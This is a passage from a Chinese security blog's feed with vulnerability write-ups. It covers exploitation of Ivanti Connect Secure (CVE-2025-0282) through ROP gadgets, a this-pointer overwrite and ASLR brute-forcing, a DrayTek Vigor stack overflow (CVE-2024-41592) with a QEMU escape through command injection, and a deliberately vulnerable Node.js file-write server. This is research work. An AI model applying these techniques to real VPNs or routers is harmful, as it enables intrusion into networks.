class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">| gadget_0[0x48]           |</span><br><span class="line">+--------------------------+</span><br><span class="line">| mov ebx, 0xfffffff0      | &lt;- Load value into EBX</span><br><span class="line">+--------------------------+</span><br><span class="line">| add esp, 0x204C          | &lt;- Adjust stack pointer</span><br><span class="line">+--------------------------+</span><br><span class="line">| mov eax, ebx             | &lt;- Copy EBX to EAX</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop ebx                  | &lt;- Restore EBX</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop esi                  | &lt;- Restore ESI</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop edi                  | &lt;- Restore EDI</span><br><span class="line">+--------------------------+</span><br><span class="line">| pop ebp                  | &lt;- Restore EBP</span><br><span class="line">+--------------------------+</span><br><span class="line">| ret                      | &lt;- Return to caller</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p>于是我采用了一个最笨的方法， 将所有引用的 lib 库全部objdump 一遍， 然后去grep </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objdump --x86-asm-syntax=intel -D  $(find . -name <span class="string">&quot;libagentdcs.so&quot;</span>) 2&gt;&amp;1 &gt; libagentdcs.so.so.txt</span><br><span class="line"></span><br><span class="line">cat ibdsplibs.txt|grep -e <span class="string">&quot;add\tesp, 0x204c&quot;</span></span><br></pre></td></tr></table></figure><p>在<code>libdsplibs.so</code> 的  <code>0x93849C</code> 地址找到了这个 gadget ，意料之外的是这里具体居然是个 swithc table 表</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-89564e17d217fee0e6c12ed9f7bfcaee-6ad36d.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-89564e17d217fee0e6c12ed9f7bfcaee-6ad36d.png" alt="image.png"></a></p><p>按照代码逻辑， 我们只要反着算就行， 例如我们这里最后 <code>vtable</code> 的地址是 <code>0x11D8940</code>， 那么就需要有一个地址存储这个指针， 直接在 ida 的binary search 里搜索</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-0799c44da550e4b6c66a26cee2362600-6dbaf5.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-0799c44da550e4b6c66a26cee2362600-6dbaf5.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-875e3f9387a3a87c2deabbf7904f8d07-01608c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-875e3f9387a3a87c2deabbf7904f8d07-01608c.png" alt="image.png"></a></p><p>找到一个这个， 所以我们最后要覆盖的<code>this</code> 指针地址为  <code>0x00934F4C</code>， 后面正常 rop 就行， 这里提一句 libc的随机化是 0xfff 位， 多核启动的时候会有一个主进程不断的fork子进程，因此我们爆破 0xfff次就一定能成功执行</p><p>拿到的权限是  nr 权限</p><pre><code class="bash">bash-4.2$ ididuid=104(nr) gid=104(nr) groups=104(nr) context=system_u:system_r:kernel_t:s0bash-4.2$</code></pre><p>完整的ROP链也留给读者实现了。</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">OpenConnect https://www.infradead.org/openconnect/download.html<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/<a href="#fnref:2" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2025-0282" scheme="https://bestwing.me/tags/CVE-2025-0282/"/>
    
    <category term="pulse" scheme="https://bestwing.me/tags/pulse/"/>
    
    <category term="vpn" scheme="https://bestwing.me/tags/vpn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-41592 vigor 栈溢出漏洞分析</title>
    <link href="https://bestwing.me/CVE-2024-41592-vigor-stack-overflow.html"/>
    <id>https://bestwing.me/CVE-2024-41592-vigor-stack-overflow.html</id>
    <published>2024-12-30T08:18:59.000Z</published>
    <updated>2024-12-30T08:25:28.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p>这个漏洞其实是分析于今年11月份，鉴于今年只更新了四篇博客，所以就把这篇也拿出来了。这也是大概率今年最后一篇博客了。</p><p>CVE-2024-41592 是 forescout 一篇为 《Breaking Into DrayTekRouters  Before Threat Actors Do It Again》<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="《Breaking Into DrayTekRouters  Before Threat Actors Do It Again》https://www.forescout.com/resources/draybreak-draytek-research/">[1]</span></a></sup>的漏洞报告其中的一个漏洞。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-6b5f0a0c315e1db6c4d723f24612317e-64f1cb.png" title="image-20241230143455676" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-6b5f0a0c315e1db6c4d723f24612317e-64f1cb.png" alt="image-20241230143455676"></a></p><p>漏洞产生于 <code>GetCGI()</code> 函数中， 在该函数中处理字符串参数会造成越界导致栈溢出。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件解压和调试准备"><a href="#固件解压和调试准备" class="headerlink" title="固件解压和调试准备"></a>固件解压和调试准备</h3><p>这里以Draytek 3910的 4.3.1 的版本作为调试 测试版本，进行展开分析。固件的解密和解压不展开赘述，可以参考之前 《HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret》 <sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="《HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret》https://www.youtube.com/watch?v=CD8HfjdDeuM">[2]</span></a></sup>slide 或者其他研究员的文章。</p><p>解压后能在 <code>rootfs/firmware/vqemu/sohod64.bin</code> 目录下找到主程序， Draytek 3910 采用了奇葩的 Linux + Qemu + RTOS 的奇葩架构，即在 arm linux操作系统上使用qemu 运行 drayos 的RTOS 操作系统。这里的调试方式采用的是使用编译 Draytek 开源的qemu代码进行编译，然后就可以正常调试。</p><p>调试之前需要对 <code>firmware/setup_qemu_linux.sh</code>  和 <code>run_linux.sh</code> 进行部分修改， 例如对<code>run_linux.sh</code> 在 <code>qemu-system-aarch64</code> 添加 <code>-s</code> 参数方便用于调试</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-1ce715fd2ea9299f784ff57860356b46-b91a0b.png" title="image-20241230145133293" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-1ce715fd2ea9299f784ff57860356b46-b91a0b.png" alt="image-20241230145133293"></a></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>我们通过一个有符号的 <code>draytek 2830</code> 的固件来快速定位到Draytek 3910 4.3.1的 <code>GetCGI()</code> 函数， 或者直接对 <code>QUERY_STRING</code> 字符串进行交叉引用。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-145d8619e1fa905c0dcc329ef7df2a99-49555b.png" title="image-20241230145702255" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-145d8619e1fa905c0dcc329ef7df2a99-49555b.png" alt="image-20241230145702255"></a></p><p>在各个 cgi 处理函数的时候都会进行一次 <code>GetCGI</code> 函数的调用来处理参数。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-11-14-9864f037c027870fc256a97cfa7ae64b-dd3b67.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-11-14-9864f037c027870fc256a97cfa7ae64b-dd3b67.png" alt="image.png"></a></p><p>在这个函数（GetCGI）里面，当有 <code>&amp;</code> 出现， 就会通过 <code>makeword</code> 函数生成一个内存空间，然后将地址赋值到栈上， 这个函数的部分逻辑伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">v19 = sub_400BFA18(<span class="string">&quot;REQUEST_METHOD&quot;</span>, a3);</span><br><span class="line"> <span class="keyword">if</span> ( v19 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">   &#123;</span><br><span class="line">     v18 = sub_400BFA18(<span class="string">&quot;QUERY_STRING&quot;</span>, a3);</span><br><span class="line">     <span class="keyword">if</span> ( !v18 )</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     idx = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ( *v18 )</span><br><span class="line">     &#123;</span><br><span class="line">       *(a2 + <span class="number">8</span> * idx) = makeword(v18, <span class="string">&#x27;&amp;&#x27;</span>);   <span class="comment">// overflow</span></span><br><span class="line">       plustospace(*(a2 + <span class="number">8</span> * idx));</span><br><span class="line">       unescape_url(*(a2 + <span class="number">8</span> * idx));</span><br><span class="line">       v16 = safe_strcrh(*(a2 + <span class="number">8</span> * idx), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">       <span class="keyword">if</span> ( v16 )</span><br><span class="line">       &#123;</span><br><span class="line">         *v16 = <span class="number">0</span>;</span><br><span class="line">         *(a2 + <span class="number">8</span> * idx + <span class="number">4LL</span>) = v16 + <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         *(a2 + <span class="number">8</span> * idx + <span class="number">4LL</span>) = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       ++idx;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>(a2 + 8 * idx）</code> 在栈上， 当输入过多的 <code>&amp;</code> 就有如下的效果：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-dc9300c9bae250d1989e1483c332886e-7ffdd5.png" title="image-20241230150417353" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-dc9300c9bae250d1989e1483c332886e-7ffdd5.png" alt="image-20241230150417353"></a> </p><p>会有一堆指针覆盖栈上的变量， 甚至能覆盖到返回地址。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>虽然我们在<code>GetCGI()</code> 函数中覆盖到了返回地址， 但是在各个 CGI 函数结尾的时候会有一个 <code>FreeCtrlName</code> 函数的调用， 该函数会将将覆盖掉得返回地址的指针置零。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-0932f8da17538fdaa0158e1bc3559a06-3cd379.png" title="image-20241230152340712" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-0932f8da17538fdaa0158e1bc3559a06-3cd379.png" alt="image-20241230152340712"></a></p><p>也正如原文章所说的， 我们需要绕过这个函数</p><blockquote><p>Although this seems straightforward, challenges exist. Consider the “FreeCtrlName()” function called when a<br>CGI handler returns (Figure 13). This function “frees” all the POST/GET request data structures, including the<br>query string buffer. It simply iterates over the 32-bit pointers located in the lower 4 bytes of the stack<br>21<br>DRAY:BREAK - BREAKING INTO DRAYTEK ROUTERS BEFORE THREAT ACTORS DO IT AGAIN<br>addresses and frees them, zeroing out the pointer values as well. Oddly, the higher 4-byte addresses (e.g.,<br>pointers to query string parameters values) are never freed</p></blockquote><p> <code>FreeCtrlName</code> 函数伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">FreeCtrlName</span><span class="params">(__int64 result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [xsp+1Ch] [xbp+1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [xsp+2Ch] [xbp+2Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(v1 + <span class="number">8</span> * i); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = sub_4061D7CC(*(v1 + <span class="number">8</span> * i), <span class="number">0x154</span>u);</span><br><span class="line">    *(v1 + <span class="number">8</span> * i) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的 free 逻辑是， 遍历栈上的指针， 一直free 直到为 0 为止， 因此我们需要找到一个函数可以在栈上写一个 0 ， 这样就能避免这个问题。在原文<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="《Breaking Into DrayTekRouters  Before Threat Actors Do It Again》https://www.forescout.com/resources/draybreak-draytek-research/">[1]</span></a></sup> 甚至后来 12月在 Blackhat  EU 《When (Remote) Shells Fall Into The Same Hole: Rooting DrayTekRouters Before Attackers Can Do It Again》<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="《When (Remote) Shells Fall Into The Same Hole: Rooting DrayTekRouters Before Attackers Can Do It Again》 https://i.blackhat.com/EU-24/Presentations/EU24-Dashevskyi-When-Remote-Shells-Fall-Into-The-Same-Hole.pdf">[3]</span></a></sup>的slide 上都没有提及这个所谓的 <code>[vulnerable-cgi-page].cgi</code> 是什么。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-677ab3daf16580c015818aea0a644423-2dbaae.png" title="image-20241230151257971" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-677ab3daf16580c015818aea0a644423-2dbaae.png" alt="image-20241230151257971"></a></p><p>但是通过一些途径我们还是能找到这个能设置 0 的 cgi ， 思路也是比较简单</p><ol><li><p>首先先将所有的 CGI 调用函数定义出来，</p></li><li><p>过滤出不需要授权的 CGI 函数 </p><p>粗浅的记得是只要函数里没有 <code>CGIbyFieldName = GetCGIbyFieldName(v6 + 32, &quot;sFormAuthStr&quot;);</code>的调用就不需要授权</p></li><li><p>猜想哪些函数可以写 0 ， 例如 <code>atoi(query_string)</code>, query_string 是 HTTP 请求传入的参数</p></li></ol><p>通过以上操作，我们其实很快就能找到一个<strong>不用授权、且参数可控可写 0</strong>  的CGI。最后的效果就是我们可以控制返回地址跳转到一个内容完全可控的地址里（内容为具体参数的内容）且由于程序运行在 qemu 环境上， 因此我们可以在目标地址上写入任意的shellcode。 但是我们需要逃逸到 qemu 外面， 本身程序提供了一个， <code>virtcons_out</code>  这个函数， 可以执行一些特殊的命令， 我们可以在第一个参数中拼接命令注入来在host上执行任意命令。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-86978ec206c26c32fda6fff0b251c6ad-8d1dbf.png" title="image-20241230154445770" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-12-30-86978ec206c26c32fda6fff0b251c6ad-8d1dbf.png" alt="image-20241230154445770"></a></p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">《Breaking Into DrayTekRouters  Before Threat Actors Do It Again》https://www.forescout.com/resources/draybreak-draytek-research/<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">《HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret》https://www.youtube.com/watch?v=CD8HfjdDeuM<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">《When (Remote) Shells Fall Into The Same Hole: Rooting DrayTekRouters Before Attackers Can Do It Again》 https://i.blackhat.com/EU-24/Presentations/EU24-Dashevskyi-When-Remote-Shells-Fall-Into-The-Same-Hole.pdf<a href="#fnref:3" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2024-41592" scheme="https://bestwing.me/tags/CVE-2024-41592/"/>
    
    <category term="draytek" scheme="https://bestwing.me/tags/draytek/"/>
    
    <category term="vigor" scheme="https://bestwing.me/tags/vigor/"/>
    
  </entry>
  
  <entry>
    <title>Exploiting File Writes in Hardened Node.js Environments</title>
    <link href="https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html"/>
    <id>https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html</id>
    <published>2024-10-15T10:23:33.000Z</published>
    <updated>2024-10-21T08:06:42.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>在 Hexacon 2024 上关注到了这么一个议题 《Exploiting File Writes in Hardened Environments - From HTTP Request to ROP Chain in Node.js 》， 同时该作者发了一个简单的 Blog 讲述了下这个原理以及部分细节。<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/ ">[1]</span></a></sup>  这里简单快速复现一下。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const express &#x3D; require(&#39;express&#39;);</span><br><span class="line">const fs &#x3D; require(&#39;fs&#39;);</span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const app &#x3D; express();</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.post(&#39;&#x2F;upload&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  const &#123; filename, content &#125; &#x3D; req.body;</span><br><span class="line"></span><br><span class="line">  if (!filename || !content) &#123;</span><br><span class="line">    return res.status(400).json(&#123; message: &#39;Filename and content are required!&#39; &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const filePath &#x3D; path.join(__dirname, &#39;uploads&#39;, filename);</span><br><span class="line"></span><br><span class="line">  fs.writeFile(filePath, content, (err) &#x3D;&gt; &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">      return res.status(500).json(&#123; message: &#39;Error saving file!&#39; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.json(&#123; message: &#39;File uploaded successfully!&#39;, path: filePath &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&#39;Server running on http:&#x2F;&#x2F;localhost:3000&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>按照文章的描述， 我们先随便构造一个可以任意文件写的 nodejs 服务 （在假设环境是readonly 的情况下）</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>按照文章的描述， nodejs 使用了 <code>libuv</code> 的这么一个库， 这个库在初始化的时候会的打开一个 Pipe 管道， 作者通过审计的时候发现有一个函数 <code>uv__signal_event</code> <sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/libuv/libuv/blob/fbe2d85bd5a5c370a8cacea92b3bdfbd9f98a530/src/unix/signal.c#L433">[2]</span></a></sup></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">uv__signal_event</span><span class="params">(<span class="keyword">uv_loop_t</span>* loop,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uv__io_t</span>* w,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">unsigned</span> <span class="keyword">int</span> events)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uv__signal_msg_t</span>* msg;</span><br><span class="line">  <span class="keyword">uv_signal_t</span>* handle;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>) * <span class="number">32</span>];</span><br><span class="line">  <span class="keyword">size_t</span> bytes, end, i;</span><br><span class="line">  <span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line">  bytes = <span class="number">0</span>;</span><br><span class="line">  end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    r = read(loop-&gt;signal_pipefd[<span class="number">0</span>], buf + bytes, <span class="keyword">sizeof</span>(buf) - bytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r == <span class="number">-1</span> &amp;&amp; errno == EINTR)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">/* `end` is rounded down to a multiple of sizeof(uv__signal_msg_t). */</span></span><br><span class="line">    end = (bytes / <span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>)) * <span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; end; i += <span class="keyword">sizeof</span>(<span class="keyword">uv__signal_msg_t</span>)) &#123;</span><br><span class="line">      msg = (<span class="keyword">uv__signal_msg_t</span>*) (buf + i);</span><br><span class="line">      handle = msg-&gt;handle;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (msg-&gt;signum == handle-&gt;signum) &#123;</span><br><span class="line">        assert(!(handle-&gt;flags &amp; UV_HANDLE_CLOSING));</span><br><span class="line">        handle-&gt;signal_cb(handle, handle-&gt;signum); <span class="comment">// callback</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      handle-&gt;dispatched_signals++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (handle-&gt;flags &amp; UV_SIGNAL_ONE_SHOT)</span><br><span class="line">        uv__signal_stop(handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个函数中， 从 <code>loop-&gt;signal_pipefd[0]</code> 读内容， 然后做一个 signum检查， 就会使用传过来的数据解引用出来一个函数指针，然后直接调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handle = msg-&gt;handle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;signum == handle-&gt;signum) &#123;</span><br><span class="line">  assert(!(handle-&gt;flags &amp; UV_HANDLE_CLOSING));</span><br><span class="line">  handle-&gt;signal_cb(handle, handle-&gt;signum); <span class="comment">// callback</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uv__signal_msg_t数据结构仅包含两个成员，一个句柄指针和一个称为signum的整数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">uv_signal_t</span>* handle;</span><br><span class="line">  <span class="keyword">int</span> signum;</span><br><span class="line">&#125; <span class="keyword">uv__signal_msg_t</span>;</span><br></pre></td></tr></table></figure><p>在这个 Pipe 是可 <code>uv__make_pipe</code> 函数创建的， 在 Docker 容器中是fd 为 11 的描述符</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-8778bac7cf173f318f9bdaef3b13b42f-071cd9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-8778bac7cf173f318f9bdaef3b13b42f-071cd9.png" alt="image.png"></a></p><p>当然这个fd num 